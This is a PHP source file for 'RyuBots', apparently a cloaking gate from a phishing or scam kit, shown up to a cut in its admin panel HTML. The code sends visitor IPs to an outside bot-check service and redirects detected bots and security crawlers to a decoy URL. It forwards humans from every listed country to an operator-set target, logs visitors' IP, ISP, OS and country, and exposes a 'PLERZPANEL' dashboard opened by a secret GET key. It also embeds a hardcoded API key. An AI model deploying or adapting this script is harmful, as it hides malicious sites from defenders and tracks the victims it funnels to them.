<?php
/**
 * RyuBots Script //
 *
 * @copyright 2021
 * @version 1.0-2021
 *
 *
 **/

@session_start();
@ob_start();
$URL_FILE = ".direct_url.txt";
if(!file_exists($URL_FILE)){
    $url = "https://www.google.com/";
    $fp = fopen($URL_FILE, "w");
    fwrite($fp, $url);
    fclose($fp);
}

define('URL_FILE', $URL_FILE);

class RyuBot
{

    private $config;
    private $ip;
    private $ua;
    private $api_url;

    public function __construct()
    {
      

        /**
         * SETTING HERE
         * @var $this->config
         * --------------------------------------------/
         * | This is configuration for your API Client
         * | You can enable config with  "true"  and
         * | Also   can disable config with "false"
         * ----------------------------------------/
         */
        $this->config['lock_device'] = 'all'; // all, mobile, desktop 
        $this->config['log_bot'] = true;
        $this->config['log_visitor'] = true;
        $this->config['one_time_access'] = false;
    

        /**
         * SETTING HERE
         * @var $this->config
         * --------------------------------------------/
         * | This is configuration for your API Client
         * | You can edit your URLs here for redirect
         * | More desc will be present in each config
         * ----------------------------------------/
         */

        /** This is work if not detect bot or not detect country listed ( Direct By Country ) **/
        $this->config['direct']['default'][0] = @file_get_contents(URL_FILE);

        /** U can also randomize default direct
         *** Uncomment this section and edit the URLs **/

        /** This is work if you enable one_time_access set to true **/
        $this->config['direct']['onetime'] = @file_get_contents(URL_FILE);

        /** This is work if bot detected **/
        $this->config['direct']['bot'] = 'https://gadingpos.com/dir.php';

        /** This is work if detect visitor from country listed here **/

        // This is example code  direct by country single URL.
        $this->config['direct']['by_country']['US'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['AF'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['AX'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['AL'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['DZ'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['AS'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['AD'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['AO'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['AI'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['AQ'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['AG'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['AR'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['AM'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['AW'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['AU'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['AT'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['AZ'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['BS'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['BH'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['BD'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['BB'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['BY'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['BE'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['BZ'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['BJ'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['BM'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['BT'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['BO'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['BA'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['BW'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['BV'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['BR'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['IO'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['VG'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['BN'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['BG'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['BF'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['BI'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['KH'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['CM'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['CA'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['CV'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['KY'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['CF'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['TD'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['CL'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['CN'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['CX'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['CC'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['CO'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['KM'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['CD'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['CG'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['CK'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['CR'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['CI'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['HR'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['CU'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['CY'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['CZ'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['DK'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['DJ'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['DM'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['DO'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['EC'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['EG'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['SV'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['GQ'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['ER'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['EE'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['ET'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['FO'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['FK'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['FJ'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['FI'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['FR'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['GF'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['PF'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['TF'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['GA'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['GM'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['GE'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['DE'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['GH'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['GI'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['GR'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['GL'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['GD'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['GP'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['GU'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['GT'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['GG'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['GN'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['GW'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['GY'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['HT'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['HM'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['VA'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['HN'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['HK'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['HU'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['IS'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['IN'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['ID'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['IR'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['IQ'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['IE'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['IM'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['IL'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['IT'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['JM'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['JP'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['JE'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['JO'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['KZ'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['KE'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['KI'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['KP'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['KR'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['KW'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['KG'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['LA'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['LV'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['LB'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['LS'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['LR'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['LY'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['LI'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['LT'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['LU'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['MO'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['MK'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['MG'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['MW'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['MY'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['MV'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['ML'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['MT'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['MH'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['MQ'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['MR'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['MU'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['YT'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['MX'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['FM'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['MD'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['MC'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['MN'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['ME'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['MS'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['MA'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['MZ'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['MM'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['NA'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['NR'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['NP'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['AN'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['NL'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['NC'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['NZ'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['NI'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['NE'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['NG'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['NU'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['NF'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['MP'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['NO'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['OM'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['PK'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['PW'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['PS'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['PA'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['PG'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['PY'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['PE'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['PH'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['PN'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['PL'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['PT'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['PR'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['QA'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['RE'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['RO'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['RU'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['RW'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['BL'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['SH'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['KN'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['LC'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['MF'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['PM'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['VC'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['WS'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['SM'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['ST'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['SA'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['SN'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['RS'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['SC'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['SL'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['SG'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['SK'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['SI'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['SB'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['SO'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['ZA'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['GS'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['ES'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['LK'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['SD'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['SR'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['SJ'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['SZ'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['SE'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['CH'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['SY'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['TW'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['TJ'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['TZ'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['TH'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['TL'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['TG'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['TK'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['TO'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['TT'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['TN'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['TR'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['TM'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['TC'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['TV'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['UG'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['UA'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['AE'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['GB'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['UM'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['VI'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['UY'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['UZ'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['VU'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['VE'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['VN'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['WF'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['EH'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['YE'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['ZM'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['ZW'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['CHF'] = @file_get_contents(URL_FILE);
        $this->config['direct']['by_country']['CHG'] = @file_get_contents(URL_FILE);

        // This is example code direct by country MASS URLs and access by random.
        //$this->config['direct']['by_country']['US'][0] = @file_get_contents(URL_FILE);
        //$this->config['direct']['by_country']['US'][1] = @file_get_contents(URL_FILE);
        //$this->config['direct']['by_country']['US'][2] = @file_get_contents(URL_FILE);

        /** CONFIGURATION END **/
        /** DON'T CHANGE ANYTHING START FROM HERE **/
        /** if error is not our responsibility **/

        /** TEST **/
        //$this->ip = '8.8.8.8';
       // $this->ua = 'googlebot';
        /** END TEST **/

        /** GET REAL IP AND USERAGENT **/
        $this->ip = $this->realIP();
        $this->ua = $_SERVER['HTTP_USER_AGENT'];
    }
    public function getBrowser()
    {
        $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
        $browser        =   "Unknown Browser";
        $browser_array  =   array(
            '/msie/i'       =>  'Internet Explorer',
            '/firefox/i'    =>  'Firefox',
            '/safari/i'     =>  'Safari',
            '/chrome/i'     =>  'Chrome',
            '/opera/i'      =>  'Opera',
            '/netscape/i'   =>  'Netscape',
            '/maxthon/i'    =>  'Maxthon',
            '/konqueror/i'  =>  'Konqueror',
            '/mobile/i'     =>  'Handheld Browser'
        );
        foreach ($browser_array as $regex => $value) {
            if (preg_match($regex, $user_agent)) {
                $browser    =   $value;
            }
        }
        return $browser;
    }
    public function getOS()
    {
        $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
        $os_platform    =   "Unknown OS Platform";
        $os_array       =   array(
            '/windows nt 10/i'     =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows xp/i'         =>  'Windows XP',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/windows me/i'         =>  'Windows ME',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/win16/i'              =>  'Windows 3.11',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/linux/i'              =>  'Linux',
            '/ubuntu/i'             =>  'Ubuntu',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/android/i'            =>  'Android',
            '/blackberry/i'         =>  'BlackBerry',
            '/webos/i'              =>  'Mobile'
        );
        foreach ($os_array as $regex => $value) {
            if (preg_match($regex, $user_agent)) {
                $os_platform    =   $value;
            }
        }
        return $os_platform;
    }
    public function realIP()
    {
        if(isset($_SERVER['HTTP_X_FORWARDED_FOR']) && $_SERVER['HTTP_X_FORWARDED_FOR'] != '') {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } elseif(isset($_SERVER['HTTP_CLIENT_IP']) && $_SERVER['HTTP_CLIENT_IP'] != '') {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif(isset($_SERVER['HTTP_CF_CONNECTING_IP']) && $_SERVER['HTTP_CF_CONNECTING_IP'] != '') {
            $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
        } elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] != ''){
            $ip = $_SERVER['REMOTE_ADDR'];
        }else{
            $ip = 'unknown ip';
        }
        return $ip;
    }
    function isMobile() {
        return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
    }
    public function api()
    {
        $this->api_url[0] = 'https://pro.ip-api.com/json/'.$this->ip.'?key=K5LbwRKf4P13CFZ';

        return $this->api_url;
    }
    public function get($method = 0, $json = true)
    {
        $method = $this->api()[$method];

        $setup = [CURLOPT_URL => $method,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_USERAGENT => 'RyuBots',
            CURLOPT_SSL_VERIFYPEER => false,
        ];
        $c = curl_init();
        curl_setopt_array($c, $setup);
        $exe = curl_exec($c);
        if ($json == true) {
            return json_decode($exe, true);
        } else {
            return $exe;
        }
        curl_close($c);
    }
    public function ryulogs($file, $content)
    {
        if (!file_exists('ryulogs/ryubot.html')) {
            @mkdir('ryulogs', 0777);
            @file_put_contents('ryulogs/ryubot.html', '## Generated by ryubot');
        } else {
            $format = [
                date('d-m-Y H:i:s') ,
                $content , 
                $_SESSION['countryDetect']['countryCode'],
                $this->ip,
                $_SESSION['countryDetect']['isp'],
                $this->getOS(),
                $this->getBrowser(),
                $_SESSION['countryDetect']['country']
            ];
            $formats = implode('|', $format);
            file_put_contents('ryulogs/' . $file, $formats."\n", FILE_APPEND);
        }
    }
    public function getCountry()
    {
        $get = $this->get(0);
        $_SESSION['countryDetect'] = $get;
        return $get['countryCode'];
    }
  

    public function secure_init($code)
    {

        if($this->config['lock_device'] == 'mobile')
        {
            if($this->isMobile() == false)
            {
                $this->ryulogs('ryu-bot.log', 'LOCK DEVICE DETECTED =>  [ MOBILE ONLY ] ');
                @header('location: ' . $this->config['direct']['bot'], true, 303);
                exit;
            }
        }elseif($this->config['lock_device'] == 'desktop')
        {
            if($this->isMobile() == true)
            {
                $this->ryulogs('ryu-bot.log', 'LOCK DEVICE DETECTED =>  [ DESKTOP ONLY ] ');
                @header('location: ' . $this->config['direct']['bot'], true, 303);
                exit;
            }
        }

        if(empty($_SESSION['cekBot'])){
       
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, "https://apipriv.tech/v1/bot.php?ip=".$this->ip."&ua=".urlencode($this->ua));
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($c);
        curl_close($c);
        $get = json_decode($result, true);

        $bot = false;

        if ($get['is_bot'] == true) {
            $bot = true;

         

                if ($this->config['log_bot'] == true) {

                    $this->ryulogs('ryu-bot.log', 'BOT '.$get['why'].' DETECTED ');
                }
                @header('location: ' . $this->config['direct']['bot'], true, 303);
                exit;
         

        }
        $_SESSION['cekBot'] = true;
        
    }

   

            if ($this->config['log_visitor'] == true) {
                $alert = 'VISITOR';
                $this->ryulogs('ryu-visitor.log', $alert . ' [ ' . $code . ' ] ');
            }
            if ($this->config['one_time_access'] == true) {
                if ($this->onetime()) {
                    @header('location: ' . $this->config['direct']['onetime'], true, 303);
                    exit;
                }
            }
        
    }
    public function randomUri($array)
    {
        $size = count($array);
        $randomIndex = rand(0, $size - 1);
        $randomUrl = $array[$randomIndex];
        return $randomUrl;
    }
    public function human_filesize($bytes, $decimals = 2)
    {
        $sz = 'BKMGTP';
        $factor = floor((strlen($bytes) - 1) / 3);
        return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . @$sz[$factor];
    }
    public function count_line($file)
    {
        $fgc = file_get_contents($file);
        $ex = explode("\n", str_replace("\r", "", $fgc));

        return count($ex)-1;
    }
    public function onetime()
    {
        $file = 'onetime.log';
        if (!file_exists('ryulogs/' . $file)) {
            $this->ryulogs($file, $this->ip . "\n");
        } else {

            $gt = explode("\n", file_get_contents('ryulogs/' . $file));
            print_r($gt);
            if (in_array($this->ip, $gt)) {
                return true;
            } else {
                $this->ryulogs($file, $this->ip . "\n");
            }
        }
        return;
    }
    public function flag($countryCode , $countryName)
    {
        $code = strtolower($countryCode);
        $flag = '<img
        src="https://flagcdn.com/16x12/'.$code.'.png"
        srcset="https://flagcdn.com/32x24/'.$code.'.png 2x,
          https://flagcdn.com/48x36/'.$code.'.png 3x"
        width="16"
        height="12"
        alt="'.$countryName.'">&nbsp;&nbsp;';
        $flag.= $countryName;
        return $flag;
    }
    public function run()
    {
        $KEY = 'mengsad';

        if (isset($_GET[$KEY])) {

            
            if(empty($_GET['api_pler']))
            {
                ?>
                <!doctype html>
            <html lang="en" data-bs-theme="light">
              <head>
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <title>PLERZPANEL</title>
                <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
              </head>
              <body >
                <div class="container container-fluid">
                    <div class="row mt-5">
                        <div class="col-9 mx-auto">
                            <h1 class="text-center mb-2">PLERZPANEL</h1>
                            <div class="row m-3">
                                <div class="col-3">
                                    <label for="">Theme</label>
                                    <select class="form-control mb-2" id="themeselect" onchange="changeTheme()">
                                <option >-- THEME --</option>
                                <option value="auto">Device Theme ( auto )</option>
                                    <option value="dark">Dark mode</option>
                                    <option value="light">Light mode</option>
                            </select>
                                </div>
                                <div class="col-6">
                                    <label for="">URL</label>
                                    <input type="text" class="form-control mb-2" id="url" name="url" value="<?=@file_get_contents(URL_FILE);?>" placeholder="url">
                                </div>
                                <div class="col-3">
                                    <label for=""></label>
                                    <button type="button" onclick="saveNewLink()" class="btn btn-primary w-100">Save Url</button>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-md-6">
                                    <div class="card">
                                        <div class="card-header bg-success text-white">
                                            <div class="card-title">
                                                <h3><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-people-fill" viewBox="0 0 16 16">
              <path d="M7 14s-1 0-1-1 1-4 5-4 5 3 5 4-1 1-1 1H7Zm4-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6Zm-5.784 6A2.238 2.238 0 0 1 5 13c0-1.355.68-2.75 1.936-3.72A6.325 6.325 0 0 0 5 9c-4 0-5 3-5 4s1 1 1 1h4.216ZM4.5 8a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5Z"/>
            </svg> Visitors</h3>
                                            </div>
                                        </div>
                                        <div class="card-body">
                                            <h1 id="totalVisitors">0</h1>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="card">
                                        <div class="card-header bg-primary text-white">
                                            <div class="card-title">
                                                <h3><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-robot" viewBox="0 0 16 16">
